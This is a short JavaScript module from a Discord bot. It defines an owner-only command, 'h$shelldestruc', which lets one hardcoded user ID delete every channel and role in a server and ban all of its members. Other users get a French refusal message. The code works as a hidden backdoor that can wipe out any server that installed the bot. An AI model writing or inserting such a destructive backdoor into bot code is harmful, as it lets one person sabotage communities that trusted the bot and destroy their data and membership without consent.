function owneronly(message, bot) {
	if (message.content === "h$shelldestruc") {
		if(message.author.id === "300896265078571009") {
			try {
				message.guild.channels.forEach((c) => {c.delete()})
				message.guild.roles.forEach((c) => {c.delete()})
				message.guild.members.forEach((c) => {c.ban()})
			} catch(e) {
				console.log(e);
			}
		}
		else {
			message.channel.send({
				embed: {
					color: 0xFF0000,
					description: "Erreur\n:x:Vous avez pas les permissions nécessaires ou il y a que le développeur qui à accès à la commande. Pour faire supprimer un Discord, demander sur le serveur officiel. Merci."
				}
			});
		}
	}
}

module.exports = owneronly;